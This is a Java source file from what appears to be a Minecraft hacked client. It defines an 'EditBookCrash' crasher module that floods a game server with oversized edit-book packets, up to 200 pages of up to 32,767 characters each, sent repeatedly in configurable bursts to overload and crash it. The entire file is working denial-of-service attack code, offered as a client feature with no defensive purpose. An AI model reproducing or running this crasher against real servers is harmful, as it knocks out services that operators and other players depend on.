package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.packets.play.PacketEditBook;

public class EditBookCrash extends Module {
	private ScheduledExecutorService executorService;

	public EditBookCrash() {
		super("EditBook", "Serverbound edit-book page flood (book UI packet Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("pages", ArgumentType.INT, 1, 200, "100");
		addArgument("pageLength", ArgumentType.INT, 1, 32767, "8192");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "20");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>Unsupported protocol: <aqua>" + protocol);
			return;
		}

		String page = "A".repeat(context.getInt("pageLength"));
		List<String> pages = new ArrayList<>();
		for (int i = 0; i < context.getInt("pages"); i++) {
			pages.add(page);
		}
		String title = "B".repeat(Math.min(context.getInt("pageLength"), 1024));
		int slot = context.getInt("slot");

		executorService = ClickCrashRunner.startPackets(
				this,
				context,
				executorService,
				() -> new PacketEditBook(protocol, slot, pages, title),
				context.getInt("packets"),
				context.getInt("threadSleep"),
				context.getInt("loopAmount")
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
